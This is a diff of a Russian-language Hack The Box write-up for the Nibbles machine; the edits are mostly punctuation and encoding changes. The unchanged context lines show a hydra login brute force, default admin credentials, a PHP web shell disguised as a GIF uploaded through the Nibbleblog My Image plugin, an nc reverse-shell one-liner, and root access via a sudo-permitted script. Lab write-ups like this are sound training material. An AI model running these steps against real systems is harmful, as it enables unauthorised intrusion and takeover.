@@ -1,4 +1,4 @@
-# Nibbles (HTB)
+﻿# Nibbles (HTB)
 
 > Платформа: Hack The Box  
 > ОС: Linux  
@@ -46,7 +46,7 @@ Privilege Escalation
 
 ## Machine Briefing
 
-Ubuntu 16.04 с Apache 2.4.18. На веб-сервере — Nibbleblog 4.0.3 "Coffee". Плагин My Image позволяет загружать файлы без проверки расширения.
+Ubuntu 16.04 с Apache 2.4.18. На веб-сервере - Nibbleblog 4.0.3 "Coffee". Плагин My Image позволяет загружать файлы без проверки расширения.
 
 ---
 
@@ -116,7 +116,7 @@ searchsploit -m php/remote/38489.rb
 }
 ```
 
-Уязвимость: при загрузке через плагин My Image сохраняется оригинальное расширение файла, тип не проверяется — можно загрузить PHP.
+Уязвимость: при загрузке через плагин My Image сохраняется оригинальное расширение файла, тип не проверяется - можно загрузить PHP.
 
 ### Получение учётных данных
 
@@ -135,7 +135,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou-50.txt 10.129.96.84 \
   http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password" -t 64
 ```
 
-После 5 неудачных попыток IP попал в blacklist (см. `users.xml`). Решение — сменить VPN-профиль, получить новый IP и подобрать вручную:
+После 5 неудачных попыток IP попал в blacklist (см. `users.xml`). Решение - сменить VPN-профиль, получить новый IP и подобрать вручную:
 
 ```
 admin:nibbles
@@ -157,7 +157,7 @@ file cmd.php
 # cmd.php: GIF image data 16188 x 26736
 ```
 
-�-агрузка через `/nibbleblog/admin.php?controller=plugins&action=list` → My Image.
+�-агрузка через `/nibbleblog/admin.php?controller=plugins&action=list` → My Image.
 
 После загрузки:
 
@@ -172,7 +172,7 @@ http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?ipp=wh
 ipp=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9001 >/tmp/f
 ```
 
-В Burp Repeater — метод POST, URL-encode через Ctrl+U.
+В Burp Repeater - метод POST, URL-encode через Ctrl+U.
 
 ```bash
 nc -lvnp 9001
@@ -205,7 +205,7 @@ User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 ```
 
-Файл отсутствует — создаём сами:
+Файл отсутствует - создаём сами:
 
 ```bash
 mkdir -p personal/stuff
@@ -224,7 +224,7 @@ cat /root/root.txt
 
 ## Flags
 
-| Флаг | �-начение                       |
+| Флаг | �-начение                       |
 |------|--------------------------------|
 | User | (см. `/home/nibbler/user.txt`) |
 | Root | (см. `/root/root.txt`)         |
@@ -233,7 +233,7 @@ cat /root/root.txt
 
 ## Key Takeaways
 
-- **Nibbleblog 4.0.3 My Image plugin** — загрузка файлов без проверки расширения и MIME, классический путь к RCE.
-- **GIF8-обёртка** — обход проверки на "изображение" без необходимости реально пересобирать файл.
-- **IP-блэклист в Nibbleblog** — 5 неудачных логинов блокируют IP; решается сменой VPN-профиля.
-- **`sudo -l` на несуществующий скрипт** — если root разрешает запуск файла от root без пароля, а файла нет, его можно создать самостоятельно.
+- **Nibbleblog 4.0.3 My Image plugin** - загрузка файлов без проверки расширения и MIME, классический путь к RCE.
+- **GIF8-обёртка** - обход проверки на "изображение" без необходимости реально пересобирать файл.
+- **IP-блэклист в Nibbleblog** - 5 неудачных логинов блокируют IP; решается сменой VPN-профиля.
+- **`sudo -l` на несуществующий скрипт** - если root разрешает запуск файла от root без пароля, а файла нет, его можно создать самостоятельно.
